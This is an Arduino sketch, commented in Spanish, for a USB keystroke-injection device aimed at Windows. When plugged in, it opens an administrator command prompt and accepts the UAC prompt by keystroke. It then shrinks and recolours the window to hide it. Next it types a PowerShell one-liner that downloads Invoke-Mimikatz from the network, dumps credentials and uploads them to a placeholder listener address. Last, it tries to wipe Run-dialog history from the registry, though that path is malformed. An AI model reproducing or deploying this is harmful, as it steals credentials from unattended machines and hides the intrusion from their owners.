#include "Keyboard.h"

int ejecutado;

void setup()
{
  Keyboard.begin();
  ejecutado = 0;
}

void loop()
{
  // damos tiempo al ordenador para  reconocer el USB
  delay(2000);
  if (ejecutado == 0)
  {
   
    openCMDAsAdmin();
    whatsNewMimikatz();
    limpia();
    ejecutado = 1;
   
  }
 
}


void openCMDAsAdmin()
/*
 *  Abrir un command prompt como administrador
 * 
 */
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  printa("powershell Start-Process cmd -Verb runAs");
  delay(1300);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.write('s');
  Keyboard.releaseAll();
  delay(1000);
  ofusca();
}

void printa(char datos[])
/*
 *  Hace print cambiando siempre el layout para evitar errores
 */
{
  changeLayout();
  Keyboard.print(datos);
  changeLayout();
  Keyboard.press(KEY_RETURN);Keyboard.releaseAll();
}

void changeLayout()
{
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.write(KEY_LEFT_SHIFT);
  Keyboard.release(KEY_LEFT_ALT);
}

void ofusca()
/*
 * Ofusca el cmd mostrandolo más pequeño y cambiando el color
 */
{
  printa("mode con:cols=18 lines=1");
  printa("color FE");
}


void whatsNewMimikatz()
/*
 * Descarga mimikatz, ejecutalo en powershell y envialo al servidor
 */
{
  printa("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('IP_A_ESCUCHAR', $output)\"");
}

void limpia()
/*
 * Limpia la ejecución
 */
 {
    printa("powershell \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\mode con:cols=18 lines=1' -Name '*' -ErrorAction SilentlyContinue\"");
    printa("exit");
 }
